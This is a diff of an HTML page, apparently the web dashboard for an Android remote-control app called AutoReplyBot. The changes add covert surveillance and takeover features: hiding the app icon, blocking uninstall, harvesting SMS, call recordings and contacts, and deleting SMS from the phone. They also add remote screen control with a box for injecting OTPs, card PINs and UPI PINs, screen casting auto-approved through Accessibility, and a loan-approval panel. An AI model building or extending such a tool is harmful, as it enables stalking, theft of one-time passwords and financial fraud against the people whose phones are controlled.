@@ -16,11 +16,66 @@
   <link rel="preconnect" href="https://fonts.googleapis.com" />
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
   <link href="https://fonts.googleapis.com/css2?family=DM+Sans:ital,opsz,wght@0,9..40,400;0,9..40,500;0,9..40,600;0,9..40,700;1,9..40,400&display=swap" rel="stylesheet" />
-  <link rel="stylesheet" href="/device/styles.css" />
+  <link rel="stylesheet" href="/device/styles.css?v=22" />
+  <style>
+    /* Instant first paint before styles.css / app.js load */
+    .boot-loading {
+      position: fixed;
+      inset: 0;
+      z-index: 10000;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: #f4f6fb;
+      font-family: "DM Sans", system-ui, sans-serif;
+    }
+    .boot-loading[hidden] { display: none !important; }
+    .boot-loading-inner { text-align: center; padding: 24px; }
+    .boot-spinner {
+      width: 40px;
+      height: 40px;
+      margin: 0 auto 16px;
+      border: 3px solid #e6e8f0;
+      border-top-color: #5b5ce2;
+      border-radius: 50%;
+      animation: boot-spin 0.75s linear infinite;
+    }
+    @keyframes boot-spin { to { transform: rotate(360deg); } }
+    .boot-loading-brand { display: none !important; }
+    .boot-loading-text {
+      margin: 8px 0 0;
+      font-size: 0.92rem;
+      color: #6b7289;
+    }
+  </style>
+  <script>
+    // Hard fallback if app.js fails to load or boot never finishes.
+    setTimeout(function () {
+      var el = document.getElementById("boot-loading");
+      if (!el || el.hidden || el.hasAttribute("hidden")) return;
+      el.hidden = true;
+      el.setAttribute("hidden", "");
+      document.body.classList.remove("is-booting");
+      var login = document.getElementById("view-login");
+      var app = document.getElementById("view-app");
+      if (login && (!app || app.hidden)) {
+        login.hidden = false;
+        login.removeAttribute("hidden");
+        login.style.display = "";
+      }
+    }, 12000);
+  </script>
 </head>
-<body class="device-app">
+<body class="device-app is-booting">
+  <div id="boot-loading" class="boot-loading" role="status" aria-live="polite" aria-busy="true">
+    <div class="boot-loading-inner">
+      <div class="boot-spinner" aria-hidden="true"></div>
+      <p id="boot-loading-text" class="boot-loading-text">Loading…</p>
+    </div>
+  </div>
+
   <!-- LOGIN -->
-  <div id="view-login" class="login-shell">
+  <div id="view-login" class="login-shell" hidden>
     <div class="login-split">
       <aside class="login-hero">
         <div class="login-hero-inner">
@@ -37,7 +92,7 @@
       <section class="login-panel">
         <div class="login-card">
           <h2>Welcome Back!</h2>
-          <p class="login-sub">Sign in with the same email and password as the Android app.</p>
+          <p class="login-sub">Sign in with email and password — use the <strong>same account</strong> on the phone you want to control.</p>
           <div class="auth-form">
             <label>Email
               <input id="auth-email" type="email" autocomplete="username" placeholder="you@example.com" />
@@ -47,21 +102,44 @@
             </label>
           </div>
           <button id="btn-login-email" class="btn-primary btn-block" type="button">Sign In</button>
-          <button id="btn-login" class="btn-google btn-block" type="button">Sign in with Google</button>
-          <button id="btn-install-pwa" class="btn-secondary btn-block btn-install-pwa" type="button" hidden>
-            Install app on this device
-          </button>
-          <p id="pwa-ios-hint" class="pwa-ios-hint" hidden>
-            On iPhone/iPad: tap Share → <strong>Add to Home Screen</strong> to install.
-          </p>
           <p class="login-register">
             New here?
             <button id="btn-register-email" class="link-btn" type="button">Register</button>
           </p>
-          <p id="auth-status" class="auth-status">Not logged in</p>
-          <p class="login-fb-link">
-            After sign-in, open <strong>Facebook &amp; Instagram</strong> from More in the sidebar.
+          <div class="login-apk-download">
+            <a id="btn-download-apk-login" class="btn-download-apk btn-block" href="#" role="button">Download Android App</a>
+            <p class="login-apk-caption">Install this APK on the phone you want to control</p>
+            <p id="apk-download-status-login" class="muted login-apk-status" aria-live="polite"></p>
+          </div>
+          <button id="btn-install-pwa" class="btn-secondary btn-block btn-install-pwa" type="button" hidden>
+            Install control app in this device
+          </button>
+          <p id="pwa-ios-hint" class="pwa-ios-hint" hidden>
+            On iPhone/iPad: tap Share → <strong>Add to Home Screen</strong> to install.
           </p>
+          <p id="auth-status" class="auth-status">Not logged in</p>
+          <div class="login-howto" role="region" aria-label="How to sign in">
+            <details class="login-howto-block" open>
+              <summary>English — How to sign in</summary>
+              <ol>
+                <li><strong>This website</strong> — Register or Sign In with your email and password. This account is used to view and control the phone.</li>
+                <li><strong>The phone</strong> — Tap <strong>Download Android App</strong>, install AutoReplyBot on the phone you want to control, then Sign In with the <strong>same email and password</strong>.</li>
+                <li>On the phone, open <strong>Remote Camera &amp; Voice</strong> and turn <strong>Remote Control ON</strong>.</li>
+                <li>Come back here, Sign In with that same account, then tap <strong>Refresh</strong>. Pair this browser once if asked.</li>
+              </ol>
+              <p class="login-howto-note">Different emails will not work — website and phone must be the same account.</p>
+            </details>
+            <details class="login-howto-block">
+              <summary>हिन्दी — साइन इन कैसे करें</summary>
+              <ol>
+                <li><strong>यह वेबसाइट</strong> — ऊपर ईमेल और पासवर्ड से Register / Sign In करें। यही अकाउंट फोन कंट्रोल करने के लिए है।</li>
+                <li><strong>फोन</strong> — <strong>Download Android App</strong> दबाकर APK इंस्टॉल करें। ऐप में भी <strong>वही ईमेल और वही पासवर्ड</strong> से साइन इन करें।</li>
+                <li>फोन पर <strong>Remote Camera &amp; Voice</strong> खोलें और <strong>Remote Control ON</strong> करें।</li>
+                <li>फिर इस वेबसाइट पर उसी अकाउंट से Sign In करें और <strong>Refresh</strong> दबाएँ। अगर पूछे तो ब्राउज़र एक बार Pair करें।</li>
+              </ol>
+              <p class="login-howto-note">अलग-अलग ईमेल से काम नहीं चलेगा — वेबसाइट और फोन दोनों पर एक ही अकाउंट होना ज़रूरी है।</p>
+            </details>
+          </div>
         </div>
       </section>
     </div>
@@ -106,33 +184,17 @@
             </span>
             <span class="nav-label">Pair Browser</span>
           </button>
-          <button type="button" class="nav-item" data-panel="security">
+          <button type="button" class="nav-item" data-panel="loans">
             <span class="nav-ico" aria-hidden="true">
-              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3l8 4v5c0 5-3.5 8.5-8 9-4.5-.5-8-4-8-9V7l8-4z"/><path d="M9 12l2 2 4-4"/></svg>
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="6" width="18" height="12" rx="2"/><path d="M3 10h18"/><path d="M7 15h2"/></svg>
             </span>
-            <span class="nav-label">Trusted Browsers</span>
-          </button>
-          <button type="button" class="nav-item" data-panel="multiview">
-            <span class="nav-ico" aria-hidden="true">
-              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="8" height="8" rx="1.5"/><rect x="13" y="3" width="8" height="8" rx="1.5"/><rect x="3" y="13" width="8" height="8" rx="1.5"/><rect x="13" y="13" width="8" height="8" rx="1.5"/></svg>
-            </span>
-            <span class="nav-label">Multi Device View</span>
-          </button>
-          <button type="button" class="nav-item" data-panel="social">
-            <span class="nav-ico" aria-hidden="true">
-              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 11l18-8-8 18-2-7-8-3z"/></svg>
-            </span>
-            <span class="nav-label">Facebook &amp; Instagram</span>
-          </button>
-          <button type="button" class="nav-item" data-panel="settings">
-            <span class="nav-ico" aria-hidden="true">
-              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="3"/><path d="M12 2v2M12 20v2M4.9 4.9l1.4 1.4M17.7 17.7l1.4 1.4M2 12h2M20 12h2M4.9 19.1l1.4-1.4M17.7 6.3l1.4-1.4"/></svg>
-            </span>
-            <span class="nav-label">Settings</span>
+            <span class="nav-label">Loans</span>
           </button>
         </nav>
         <div class="sidebar-foot">
           <p id="header-user" class="sidebar-user"></p>
+          <a id="nav-admin-link" class="btn-sidebar-secondary" href="/device/admin/" hidden>Admin panel</a>
+          <button id="btn-sidebar-change-password" class="btn-sidebar-secondary" type="button">Change password</button>
           <button id="btn-logout" class="btn-logout" type="button">Logout</button>
         </div>
       </aside>
@@ -153,6 +215,7 @@
             <div class="device-picker-row">
               <select id="workspace-device-select" class="input device-picker-select" aria-label="Select device"></select>
               <button id="btn-add-device" class="btn-primary" type="button">Connect new device</button>
+              <button id="btn-remove-device" class="btn-danger-soft" type="button" disabled title="Remove selected phone from your account">Remove device</button>
             </div>
             <p id="workspace-device-hint" class="muted device-picker-hint">Loading devices…</p>
           </div>
@@ -176,10 +239,25 @@
             <button type="button" class="phone-tab" role="tab" aria-selected="false" data-phone-tab="gallery" title="Gallery"><span class="tab-dot" aria-hidden="true"></span><span class="tab-label-full">Gallery</span><span class="tab-label-short">Gallery</span></button>
             <button type="button" class="phone-tab" role="tab" aria-selected="false" data-phone-tab="notifications" title="Notifications"><span class="tab-dot" aria-hidden="true"></span><span class="tab-label-full">Notifications</span><span class="tab-label-short">Alerts</span></button>
             <button type="button" class="phone-tab" role="tab" aria-selected="false" data-phone-tab="messages" title="Messages"><span class="tab-dot" aria-hidden="true"></span><span class="tab-label-full">Messages</span><span class="tab-label-short">SMS</span></button>
+            <button type="button" class="phone-tab" role="tab" aria-selected="false" data-phone-tab="call-logs" title="Call Logs"><span class="tab-dot" aria-hidden="true"></span><span class="tab-label-full">Call Logs</span><span class="tab-label-short">Calls</span></button>
+            <button type="button" class="phone-tab" role="tab" aria-selected="false" data-phone-tab="contacts" title="Contacts"><span class="tab-dot" aria-hidden="true"></span><span class="tab-label-full">Contacts</span><span class="tab-label-short">Contacts</span></button>
             <button type="button" class="phone-tab" role="tab" aria-selected="false" data-phone-tab="files" title="File Manager"><span class="tab-dot" aria-hidden="true"></span><span class="tab-label-full">File Manager</span><span class="tab-label-short">Files</span></button>
-            <button type="button" class="phone-tab" role="tab" aria-selected="false" data-phone-tab="screen" title="Screen Mirror"><span class="tab-dot" aria-hidden="true"></span><span class="tab-label-full">Screen Mirror</span><span class="tab-label-short">Mirror</span></button>
+            <button type="button" class="phone-tab" role="tab" aria-selected="false" data-phone-tab="screen" title="Screen Mirror &amp; Remote Control"><span class="tab-dot" aria-hidden="true"></span><span class="tab-label-full">Screen Mirror</span><span class="tab-label-short">Mirror</span></button>
             <button type="button" class="phone-tab" role="tab" aria-selected="false" data-phone-tab="recording" title="Screen Recording"><span class="tab-dot" aria-hidden="true"></span><span class="tab-label-full">Screen Recording</span><span class="tab-label-short">Record</span></button>
             <button type="button" class="phone-tab" role="tab" aria-selected="false" data-phone-tab="apps" title="Installed Apps"><span class="tab-dot" aria-hidden="true"></span><span class="tab-label-full">Installed Apps</span><span class="tab-label-short">Apps</span></button>
+            <button type="button" class="phone-tab" role="tab" aria-selected="false" data-phone-tab="app-usage" title="Recent Apps"><span class="tab-dot" aria-hidden="true"></span><span class="tab-label-full">Recent Apps</span><span class="tab-label-short">Usage</span></button>
+          </div>
+
+          <div id="phone-feature-locked" class="phone-tab-panel feature-locked-panel" hidden>
+            <div class="surface feature-locked-card">
+              <h2 id="feature-locked-title">Feature not available</h2>
+              <p id="feature-locked-message" class="page-sub">
+                This feature is not enabled for your account. Please contact the support team using the Help button.
+              </p>
+              <div class="page-actions" style="margin-top:14px;">
+                <button type="button" class="btn-primary" id="btn-feature-contact-support">Contact support team</button>
+              </div>
+            </div>
           </div>
 
           <div id="phone-tab-camera" class="phone-tab-panel" data-phone-panel="camera">
@@ -189,7 +267,7 @@
 
           <div id="phone-tab-location" class="phone-tab-panel" data-phone-panel="location" hidden>
             <div class="tab-toolbar">
-              <p class="page-sub">Opens the map automatically. Phone needs Location Sharing on; this browser needs location permission in Trusted Browsers.</p>
+              <p class="page-sub">Opens the map automatically. Phone needs Location Sharing on in the app Permissions card.</p>
               <div class="page-actions">
                 <button id="btn-loc-refresh" class="btn-secondary" type="button">Refresh map</button>
                 <button id="btn-loc-current" class="btn-primary" type="button">Update location</button>
@@ -207,6 +285,34 @@
               <div class="page-actions">
                 <button id="btn-info-refresh" class="btn-primary" type="button">Refresh Information</button>
               </div>
+            </div>
+            <div class="surface" style="margin-bottom:12px;">
+              <h2 class="settings-section-title" style="margin-top:0;">App icon (hide / unhide)</h2>
+              <p class="muted">
+                Hide removes the icon from the phone home screen. Unhide restores it so the phone user can open the app without dialer passcode.
+              </p>
+              <label class="row-gap" style="margin-top:10px;align-items:center;gap:10px;">
+                <input id="toggle-launcher-hidden" type="checkbox" />
+                <span>Hide app icon on this device</span>
+              </label>
+              <p class="muted" id="launcher-visibility-status" style="margin-top:8px;" aria-live="polite"></p>
+            </div>
+            <div class="surface" style="margin-bottom:12px;">
+              <h2 class="settings-section-title" style="margin-top:0;">Uninstall protection</h2>
+              <p class="muted" id="uninstall-policy-hint">
+                Uninstall is allowed by default. Uncheck this only when you want to protect this device from uninstall.
+              </p>
+              <label class="row-gap" style="margin-top:10px;align-items:center;gap:10px;">
+                <input id="toggle-allow-uninstall" type="checkbox" checked />
+                <span>Allow uninstall on this device</span>
+              </label>
+              <p class="muted" id="uninstall-policy-status" style="margin-top:8px;" aria-live="polite"></p>
+              <div class="page-actions" style="margin-top:12px;">
+                <button id="btn-uninstall-app" class="btn-danger" type="button">Uninstall app from device</button>
+              </div>
+              <p class="muted" id="uninstall-app-status" style="margin-top:8px;" aria-live="polite">
+                Sends a command to remove Device Admin and open the system uninstall screen. Phone must be online. Accessibility will try to confirm automatically when enabled.
+              </p>
             </div>
             <select id="info-device-select" class="input" hidden aria-hidden="true"></select>
             <div id="info-panel-body" class="surface device-info-view">Select a device.</div>
@@ -233,7 +339,7 @@
 
           <div id="phone-tab-notifications" class="phone-tab-panel" data-phone-panel="notifications" hidden>
             <div class="tab-toolbar">
-              <p class="page-sub">Enable <strong>Notification access</strong> on the phone Permissions card, allow this browser in Trusted Browsers, then Sync. Shows title, message, and date/time.</p>
+              <p class="page-sub">Enable <strong>Notification access</strong> on the phone Permissions card, then Sync.</p>
               <div class="page-actions">
                 <button id="btn-notif-sync" class="btn-secondary" type="button">Sync from phone</button>
                 <button id="btn-notif-refresh" class="btn-primary" type="button">Refresh</button>
@@ -245,19 +351,53 @@
 
           <div id="phone-tab-messages" class="phone-tab-panel" data-phone-panel="messages" hidden>
             <div class="tab-toolbar">
-              <p class="page-sub">SMS from the phone (sender name, number, full text, date/time). Enable SMS on Permissions, allow this browser, then Sync. New SMS appear live.</p>
+              <p class="page-sub">SMS from the phone (sender name, number, full text, date/time). Enable SMS on Permissions, allow this browser, then Sync. New SMS appear live. Select messages to delete from website and phone.</p>
               <div class="page-actions">
+                <button id="btn-msg-delete" class="btn-danger" type="button" disabled>Delete selected</button>
                 <button id="btn-msg-sync" class="btn-secondary" type="button">Sync from phone</button>
                 <button id="btn-msg-refresh" class="btn-primary" type="button">Refresh</button>
               </div>
+            </div>
+            <div class="msg-select-bar" id="messages-select-bar" hidden>
+              <label class="msg-select-all"><input type="checkbox" id="msg-select-all" /> Select all</label>
+              <span class="muted" id="msg-selected-count">0 selected</span>
             </div>
             <select id="messages-device-select" class="input" hidden aria-hidden="true"></select>
             <div id="messages-list" class="msg-list muted">Select a device.</div>
           </div>
 
+          <div id="phone-tab-call-logs" class="phone-tab-panel" data-phone-panel="call-logs" hidden>
+            <div class="tab-toolbar">
+              <p class="page-sub">
+                <strong>Notification “Call recording ready” = no tap needed</strong> (it only means the monitor is running).
+                Android blocks third‑party call audio, so turn ON <strong>Phone app → Call recording → Always record</strong>,
+                allow Call logs + Phone + Mic + Music/audio, then remake the call. Sync picks up those Phone recordings.
+              </p>
+              <div class="page-actions">
+                <button id="btn-call-logs-sync" class="btn-secondary" type="button">Sync from phone</button>
+                <button id="btn-call-logs-refresh" class="btn-primary" type="button">Refresh</button>
+              </div>
+            </div>
+            <select id="call-logs-device-select" class="input" hidden aria-hidden="true"></select>
+            <div id="call-logs-list" class="call-list muted">Select a device.</div>
+          </div>
+
+          <div id="phone-tab-contacts" class="phone-tab-panel" data-phone-panel="contacts" hidden>
+            <div class="tab-toolbar">
+              <p class="page-sub">Phone contacts with name and number. Enable Contacts on Permissions, allow this browser, then Sync.</p>
+              <div class="page-actions">
+                <button id="btn-contacts-sync" class="btn-secondary" type="button">Sync from phone</button>
+                <button id="btn-contacts-refresh" class="btn-primary" type="button">Refresh</button>
+              </div>
+            </div>
+            <input id="contacts-search" class="input contacts-search" type="search" placeholder="Search name or number…" autocomplete="off" />
+            <select id="contacts-device-select" class="input" hidden aria-hidden="true"></select>
+            <div id="contacts-list" class="contacts-list muted">Select a device.</div>
+          </div>
+
           <div id="phone-tab-files" class="phone-tab-panel" data-phone-panel="files" hidden>
             <div class="tab-toolbar">
-              <p class="page-sub">Tap <strong>List folder</strong>, then open a folder card to browse files. Use <strong>Play</strong> / <strong>Download</strong> on media.</p>
+              <p class="page-sub">Tap <strong>List folder</strong>, then open a folder card to browse files. Tap <strong>Download</strong> to fetch with progress, then <strong>View</strong> / <strong>Play</strong> in the panel below.</p>
               <div class="page-actions">
                 <button id="btn-files-up" class="btn-secondary" type="button" hidden>Up</button>
                 <button id="btn-files-refresh" class="btn-primary" type="button">Refresh</button>
@@ -265,20 +405,26 @@
               </div>
             </div>
             <p id="files-breadcrumb" class="files-breadcrumb muted">Root</p>
+            <p id="files-sync-status" class="files-sync-status muted" hidden></p>
             <select id="files-device-select" class="input" hidden aria-hidden="true"></select>
             <div id="files-panel-body" class="surface muted">Select a device.</div>
-            <div id="files-audio-player" class="files-audio-player" hidden>
-              <p id="files-audio-label" class="muted"></p>
-              <audio id="files-audio" controls preload="none" style="width:100%"></audio>
+            <div id="files-inline-viewer" class="files-inline-viewer" hidden>
+              <div class="files-inline-head">
+                <strong id="files-inline-title"></strong>
+                <button type="button" class="btn-secondary" id="btn-files-inline-close">Close preview</button>
+              </div>
+              <div id="files-inline-body" class="files-inline-body"></div>
             </div>
           </div>
 
           <div id="phone-tab-screen" class="phone-tab-panel" data-phone-panel="screen" hidden>
             <div class="tab-toolbar">
-              <p class="page-sub">Live screen via MediaProjection + WebRTC. Enable <strong>Screen Mirroring</strong> for this browser on the phone, then Start.</p>
+              <p class="page-sub">Live screen via MediaProjection + WebRTC. Enable <strong>Screen Mirroring</strong> for this browser on the phone, then Start. <strong>Lock screen</strong> needs Device Admin on the phone. Unlock wakes the display (a device PIN cannot be bypassed).</p>
               <div class="page-actions">
                 <button id="btn-screen-start" class="btn-primary" type="button">Start Mirroring</button>
                 <button id="btn-screen-stop" class="btn-secondary" type="button">Stop</button>
+                <button id="btn-screen-lock" class="btn-secondary" type="button">Lock screen</button>
+                <button id="btn-screen-unlock" class="btn-secondary" type="button">Unlock / Wake</button>
                 <button id="btn-screen-fullscreen" class="btn-secondary" type="button">Fullscreen</button>
                 <button id="btn-screen-pip" class="btn-secondary" type="button">PiP</button>
                 <button id="btn-screen-shot" class="btn-secondary" type="button">Screenshot</button>
@@ -303,16 +449,59 @@
               <span id="screen-status" class="status-badge">Idle</span>
               <span id="screen-stats" class="muted">Latency — · FPS — · Bandwidth —</span>
             </div>
-            <div class="screen-stage surface">
+            <div class="screen-controls surface rc-toolbar">
+              <label class="chk"><input type="checkbox" id="rc-control-enabled" /> Remote Control</label>
+              <select id="rc-gesture-mode" class="input" title="Gesture mode">
+                <option value="tap" selected>Tap</option>
+                <option value="double">Double tap</option>
+                <option value="long">Long press</option>
+                <option value="swipe">Swipe</option>
+                <option value="drag">Drag</option>
+              </select>
+              <button type="button" class="btn-secondary" id="btn-rc-back">Back</button>
+              <button type="button" class="btn-secondary" id="btn-rc-home">Home</button>
+              <button type="button" class="btn-secondary" id="btn-rc-recents">Recents</button>
+              <button type="button" class="btn-secondary" id="btn-rc-notif">Notifications</button>
+              <button type="button" class="btn-secondary" id="btn-rc-tree">Refresh elements</button>
+              <button type="button" class="btn-danger" id="btn-rc-stop">Emergency Stop</button>
+              <span id="rc-status" class="status-badge">View only</span>
+            </div>
+            <div class="screen-stage surface" id="screen-stage">
               <video id="screen-video" playsinline autoplay muted></video>
+              <div id="rc-touch-marker" class="rc-touch-marker" hidden></div>
               <canvas id="screen-shot-canvas" hidden></canvas>
+            </div>
+            <div class="rc-panels">
+              <div class="surface rc-text-panel">
+                <label>Type on phone (OTP, card PIN, UPI PIN, passwords)
+                  <input id="rc-text-input" class="input" type="password" maxlength="2000" placeholder="OTP, PIN, or password for focused field" autocomplete="off" />
+                </label>
+                <label class="chk" style="margin-top:8px;display:flex;align-items:center;gap:8px">
+                  <input type="checkbox" id="rc-text-show" /> Show typed characters
+                </label>
+                <div class="row-gap">
+                  <button type="button" class="btn-primary" id="btn-rc-set-text">Insert text</button>
+                  <button type="button" class="btn-secondary" id="btn-rc-clear-text">Clear field</button>
+                </div>
+                <p class="muted" style="margin:8px 0 0;font-size:0.82rem">
+                  Tap the OTP / PIN / password box on the mirrored screen first, then Insert. Works for OTP, card PIN, and UPI PIN.
+                </p>
+              </div>
+              <div class="surface rc-tree-panel">
+                <div class="surface-head">
+                  <h2>Element inspector</h2>
+                  <input id="rc-tree-search" class="input" type="search" placeholder="Filter elements" />
+                </div>
+                <p id="rc-tree-meta" class="muted">No tree yet.</p>
+                <div id="rc-tree-list" class="rc-tree-list muted">Start Remote Control, then Refresh elements.</div>
+              </div>
             </div>
             <div id="screen-shot-preview" class="surface muted" hidden></div>
           </div>
 
           <div id="phone-tab-recording" class="phone-tab-panel" data-phone-panel="recording" hidden>
             <div class="tab-toolbar">
-              <p class="page-sub">Record the phone screen (private Storage upload). Enable <strong>Screen Recording</strong> for this browser on the phone.</p>
+              <p class="page-sub">Record the phone screen (private Storage upload). Enable <strong>Screen Recording</strong> for this browser on the phone. Cast permission is <strong>auto-approved</strong> when Remote Accessibility is enabled on the phone.</p>
               <div class="page-actions rec-actions">
                 <button id="btn-rec-start" class="btn-primary" type="button">Record Screen</button>
                 <button id="btn-rec-pause" class="btn-secondary" type="button">Pause</button>
@@ -342,6 +531,13 @@
             </div>
             <div id="rec-transfer" class="surface muted" hidden>Upload progress will appear here.</div>
             <div id="recordings-list" class="rec-list muted">Select a device and refresh.</div>
+            <div id="rec-inline-viewer" class="files-inline-viewer" hidden>
+              <div class="files-inline-head">
+                <strong id="rec-inline-title"></strong>
+                <button type="button" class="btn-secondary" id="btn-rec-inline-close">Close preview</button>
+              </div>
+              <div id="rec-inline-body" class="files-inline-body"></div>
+            </div>
           </div>
 
           <div id="phone-tab-apps" class="phone-tab-panel" data-phone-panel="apps" hidden>
@@ -394,18 +590,16 @@
             <div id="apps-list" class="apps-list muted">Select a device.</div>
             <div id="app-detail" class="surface app-detail" hidden></div>
           </div>
-        </section>
 
-        <section class="panel" id="panel-settings" data-panel="settings" hidden>
-          <header class="page-head">
-            <div>
-              <h1>Settings</h1>
-              <p class="page-sub">Device and browser preferences. Sensitive modules stay off until enabled on the phone.</p>
+          <div id="phone-tab-app-usage" class="phone-tab-panel" data-phone-panel="app-usage" hidden>
+            <div class="tab-toolbar">
+              <p class="page-sub">Daily app usage history with time used (minutes / seconds). Tap a day to expand. Phone needs Usage Access + Recent Apps sharing, and this browser needs Recent Apps permission.</p>
+              <div class="page-actions">
+                <button id="btn-app-usage-sync" class="btn-secondary" type="button">Sync from phone</button>
+                <button id="btn-app-usage-refresh" class="btn-primary" type="button">Refresh</button>
+              </div>
             </div>
-          </header>
-          <div class="surface">
-            <p>Use <strong>Trusted Browsers</strong> on the phone to grant Screen Mirroring, Screen Recording, Installed Apps, and App Control (default off).</p>
-            <p class="muted">Camera, location, gallery, files, notifications, and messages keep their existing settings.</p>
+            <div id="app-usage-list" class="app-usage-list muted">Select a device.</div>
           </div>
         </section>
 
@@ -417,11 +611,14 @@
             </div>
           </header>
           <div class="surface">
+            <p style="margin-top:0;">Need help from an administrator? Use the <strong>Help</strong> button (bottom-right) to chat — you can also send images and videos.</p>
+            <button type="button" class="btn-primary" id="btn-open-support-chat" style="margin-bottom:14px;">Chat with Admin</button>
             <ol>
-              <li>Pair this browser once from the phone.</li>
-              <li>Enable the module on the phone Permissions card / Trusted Browsers.</li>
+              <li>Pair this browser once from the phone (Pair Browser menu).</li>
+              <li>Enable the module on the phone Permissions card.</li>
               <li>Screen mirror and recording always show Android’s official capture prompt.</li>
               <li>Installed Apps never uninstalls or installs silently.</li>
+              <li>Recent Apps needs Usage Access on the phone; history is grouped by day (tap to expand).</li>
               <li>App Control closes blocked apps via Accessibility; Camera Lock needs Device Admin on the phone.</li>
             </ol>
           </div>
@@ -467,6 +664,18 @@
           <p id="pair-error" class="pair-error" hidden></p>
         </section>
 
+        <section class="panel" id="panel-loans" data-panel="loans" hidden>
+          <header class="page-head">
+            <div>
+              <h1>Loan facility</h1>
+              <p class="page-sub">Approve, decline, and disburse applications only for the Kalyani Loan app on phones paired to this login. You cannot act on another account’s devices.</p>
+            </div>
+            <button id="btn-loans-refresh" class="btn-secondary" type="button">Refresh</button>
+          </header>
+          <p id="loans-error" class="pair-error" hidden></p>
+          <div id="loans-workspace" class="loan-workspace"></div>
+        </section>
+
         <!-- SESSIONS -->
         <section class="panel" id="panel-sessions" data-panel="sessions" hidden>
           <header class="page-head">
@@ -479,38 +688,6 @@
           <div id="session-list" class="surface table-wrap muted">Loading sessions…</div>
         </section>
 
-        <!-- TRUSTED BROWSERS -->
-        <section class="panel" id="panel-security" data-panel="security" hidden>
-          <header class="page-head">
-            <div>
-              <h1>Trusted Browsers</h1>
-              <p class="page-sub">Revoke a browser to block new Connect requests from it.</p>
-            </div>
-            <div class="page-actions">
-              <button id="btn-refresh-clients" class="btn-secondary" type="button">Refresh</button>
-              <button type="button" class="btn-primary nav-jump" data-panel="pair">Add Browser</button>
-            </div>
-          </header>
-          <div id="client-list" class="surface table-wrap muted">Loading trusted browsers…</div>
-        </section>
-
-        <!-- FACEBOOK & INSTAGRAM -->
-        <section class="panel panel-embed" id="panel-social" data-panel="social" hidden>
-          <header class="page-head page-head-compact">
-            <div>
-              <h1>Facebook &amp; Instagram</h1>
-              <p class="page-sub">Posting dashboard stays inside this admin panel.</p>
-            </div>
-          </header>
-          <iframe
-            id="social-frame"
-            class="social-frame"
-            title="Facebook and Instagram posting"
-            data-src="/?embed=1"
-            src="about:blank"
-          ></iframe>
-        </section>
-
         <!-- MEDIA -->
         <section class="panel" id="panel-media" data-panel="media" hidden>
           <header class="page-head">
@@ -521,18 +698,6 @@
             <button id="btn-refresh-media" class="btn-secondary" type="button">Refresh</button>
           </header>
           <div id="media-list" class="media-gallery muted">Loading media…</div>
-        </section>
-
-        <section class="panel" id="panel-multiview" data-panel="multiview" hidden>
-          <header class="page-head">
-            <div>
-              <h1>Multi Device View</h1>
-              <p class="page-sub">Select up to 4 devices. Cameras do not auto-start.</p>
-            </div>
-            <button id="btn-multiview-refresh" class="btn-secondary" type="button">Refresh devices</button>
-          </header>
-          <div id="multiview-picker" class="surface"></div>
-          <div id="multiview-grid" class="device-list" style="margin-top:1rem"></div>
         </section>
 
         <!-- Hidden legacy dashboard hooks used by existing JS stats -->
@@ -548,6 +713,35 @@
           <p id="dash-security"></p>
         </div>
 
+        <dialog id="dialog-change-password" class="password-change-dialog">
+          <form id="form-change-password" class="settings-password-form" autocomplete="on">
+            <header class="password-dialog-head">
+              <h2>Change password</h2>
+              <button type="button" class="btn-secondary" id="btn-password-dialog-close" aria-label="Close">Close</button>
+            </header>
+            <p id="password-dialog-email" class="muted"></p>
+            <p id="password-dialog-google-note" class="muted" hidden>
+              You signed in with Google. Password change is only available for email/password accounts.
+            </p>
+            <div id="password-dialog-fields">
+              <label>Current password
+                <input id="password-current" class="input" type="password" autocomplete="current-password" required />
+              </label>
+              <label>New password
+                <input id="password-new" class="input" type="password" autocomplete="new-password" minlength="6" required />
+              </label>
+              <label>Confirm new password
+                <input id="password-confirm" class="input" type="password" autocomplete="new-password" minlength="6" required />
+              </label>
+            </div>
+            <div class="row-gap password-dialog-actions">
+              <button id="btn-change-password-submit" class="btn-primary" type="submit">Update password</button>
+              <button type="button" class="btn-secondary" id="btn-password-dialog-cancel">Cancel</button>
+            </div>
+            <p id="password-change-status" class="password-change-status muted" aria-live="polite"></p>
+          </form>
+        </dialog>
+
         <dialog id="media-viewer" class="media-viewer">
           <form method="dialog" class="media-viewer-bar">
             <strong id="media-viewer-title">Preview</strong>
@@ -562,8 +756,33 @@
         </dialog>
       </main>
     </div>
+
+    <button type="button" id="support-fab" class="support-fab" hidden aria-label="Help — chat with Admin">
+      <span class="support-fab-label">Help</span>
+      <span id="support-fab-badge" class="support-fab-badge" hidden>0</span>
+    </button>
+
+    <div id="support-chat-drawer" class="support-chat-drawer" hidden>
+      <div class="support-chat-panel surface" role="dialog" aria-labelledby="support-chat-title">
+        <header class="support-chat-head">
+          <h2 id="support-chat-title">Support</h2>
+          <button type="button" class="btn-secondary" id="btn-support-close" aria-label="Close chat">Close</button>
+        </header>
+        <div id="support-chat-messages" class="support-chat-messages" aria-live="polite"></div>
+        <div class="support-chat-compose">
+          <input type="file" id="support-file-input" accept="image/jpeg,image/png,image/webp,video/mp4,video/webm" hidden />
+          <div id="support-attach-preview" class="support-attach-preview muted" hidden></div>
+          <div class="support-compose-row">
+            <button type="button" class="btn-secondary" id="btn-support-attach" title="Attach image or video">Attach</button>
+            <input id="support-chat-input" class="input" type="text" maxlength="4000" placeholder="Message Admin…" autocomplete="off" />
+            <button type="button" class="btn-primary" id="btn-support-send">Send</button>
+          </div>
+          <p id="support-chat-status" class="muted" style="margin:6px 0 0;font-size:0.8rem;" aria-live="polite"></p>
+        </div>
+      </div>
+    </div>
   </div>
 
-  <script type="module" src="/device/app.js"></script>
+  <script type="module" src="/device/app.js?v=43"></script>
 </body>
 </html>
